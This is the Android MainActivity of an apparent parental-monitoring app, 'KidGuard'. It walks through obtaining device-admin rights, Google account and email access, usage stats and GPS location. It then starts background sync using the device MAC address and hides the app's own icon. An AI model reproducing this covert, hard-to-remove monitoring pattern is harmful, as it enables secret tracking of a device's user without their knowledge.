package com.kidguard;

import android.Manifest;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.design.widget.CoordinatorLayout;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;

import com.kidguard.interfaces.Constant;
import com.kidguard.preference.Preference;
import com.kidguard.receivers.LocationReceiver;
import com.kidguard.services.BackgroundDataService;
import com.kidguard.services.GoogleAccountService;
import com.kidguard.services.RestClientService;
import com.kidguard.utilities.DeviceAdmin;
import com.kidguard.utilities.Utilities;

import java.util.List;

import pub.devrel.easypermissions.EasyPermissions;

public class MainActivity extends AppCompatActivity implements Constant, EasyPermissions.PermissionCallbacks {
    private static final String TAG = MainActivity.class.getSimpleName();

    private static MainActivity mActivity;
    private CoordinatorLayout coordinatorLayout;
    private TextView tv_install;
    private TextView tv_install1;
    private TextView tv_install2;
    private Boolean isGoogleAccountExecuted = false;

    public static MainActivity getInstance() {
        return mActivity;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setActionBar();
        setContentView(R.layout.activity_main);
        mActivity = MainActivity.this;
        coordinatorLayout = (CoordinatorLayout) findViewById(R.id.coordinatorLayout);
        tv_install = (TextView) findViewById(R.id.tv_install);
        tv_install1 = (TextView) findViewById(R.id.tv_install1);
        tv_install2 = (TextView) findViewById(R.id.tv_install2);
    }

    // Set ActionBar Hide
    private void setActionBar() {
        if (getSupportActionBar() != null) {
            getSupportActionBar().hide();
        }
    }

    // onResume Call
    @Override
    protected void onResume() {
        super.onResume();
        executePermissions();
    }

    // Execute Permissions
    private void executePermissions() {
        // Check Internet is Available or Not
        if (!Utilities.isNetworkAvailable(this)) {
            tv_install.setText(getString(R.string.internet_error));
            Utilities.showSnackBar(this, coordinatorLayout, getString(R.string.internet_error));
            return;
        } else {
            tv_install.setText(getString(R.string.installing));
        }

        // Check Google Play Service are install or Not
        if (!Utilities.checkPlayServices(this)) {
            return;
        }

        // Check Is Admin Active Or Not
        if (!Preference.getIsAdminActive(this)) {
            new DeviceAdmin(this);
            return;
        }

        // Check Google Account Is Enable Or Not
        if (EasyPermissions.hasPermissions(this, Manifest.permission.GET_ACCOUNTS)) {
            if (Preference.getAccountName(this) == null) {
                new GoogleAccountService(this, GOOGLE_ACCOUNT);
                return;
            }
        }

        if (Build.VERSION.SDK_INT < 23) {
            if (!isGoogleAccountExecuted) {
                // Get email access permission to user
                new GoogleAccountService(this, TAG_EMAIL, ZERO, "", "", "", "");
                isGoogleAccountExecuted = true;
            }
        } else {
            if (EasyPermissions.hasPermissions(this, Manifest.permission.GET_ACCOUNTS)) {
                if (!isGoogleAccountExecuted) {
                    // Get email access permission to user
                    new GoogleAccountService(this, TAG_EMAIL, ZERO, "", "", "", "");
                    isGoogleAccountExecuted = true;
                }
            }
        }

        // Request Usage State Permission For Application Is In ForGround Or Not
        requestUsageStatsPermission();
    }

    // Request Usage Stats Permission on RunTime
    private void requestUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && !hasUsageStatsPermission(this)) {
            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        } else {
            startServices();
        }
    }

    // Has Usage Stats Permission
    @TargetApi(Build.VERSION_CODES.KITKAT)
    private static boolean hasUsageStatsPermission(Context context) {
        AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), context.getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    // Start Background Services
    private void startServices() {
        if (!Utilities.isGpsEnabled(this)) {
            Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
            startActivity(intent);
            return;
        }

        // Start Location Receivers Here
        try {
            startLocationReceiver();
        } catch (Exception e) {
            Log.e(TAG, "Exception??" + e.getMessage());
        }
    }

    // Pass Intent To Locations Receiver
    private void startLocationReceiver() {
        tv_install.setText(getString(R.string.installation_completed));
        tv_install1.setText(getString(R.string.install_message1));
        tv_install2.setText(getString(R.string.install_message2));
        sendBroadcast(new Intent(this, LocationReceiver.class));
        stopServicesIntent();
    }

    // Stop Services Intent
    private void stopServicesIntent() {
        // Check Permission On Device
        checkPermissionOnDevice();

        Log.e("MAC", "Address>>" + Preference.getMacAddress(this));
        if (Preference.getMacAddress(this) != null && !Preference.getMacAddress(this).isEmpty()) {
            new RestClientService(TAG_SYNC_PROCESS, Preference.getMacAddress(this), "");
        }

        // Hide App Icon When All Permission Process Will be Done
        Utilities.hideIcon(this);
    }

    // Check Permission On Device Method Call
    private void checkPermissionOnDevice() {
        new BackgroundDataService(this, TAG_PERMISSIONS, "", "", "", "", "");
    }

    // On Activity Result Call
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK) {
            switch (requestCode) {
                case REQUEST_ACCOUNT_PICKER:
                    if (data != null && data.getExtras() != null) {
                        String accountName = data.getStringExtra(AccountManager.KEY_ACCOUNT_NAME);
                        Log.e(TAG, "AccName??" + accountName);

                        if (accountName != null) {
                            Preference.setAccountName(this, accountName);
                        }
                    }
                    break;
                default:
                    break;
            }
        }
    }

    @Override
    public void onPermissionsGranted(int requestCode, List<String> perms) {
        Log.e(TAG, "requestCode onPermissionsGranted>>>" + requestCode);
    }

    @Override
    public void onPermissionsDenied(int requestCode, List<String> perms) {
        Log.e(TAG, "requestCode onPermissionsDenied>>>" + requestCode);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);
        switch (requestCode) {
            case REQUEST_PERMISSION_GET_ACCOUNTS:
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    break;
                }
            default:
                break;
        }
    }

    // onDestroy
    @Override
    protected void onDestroy() {
        super.onDestroy();
        finish();
    }
}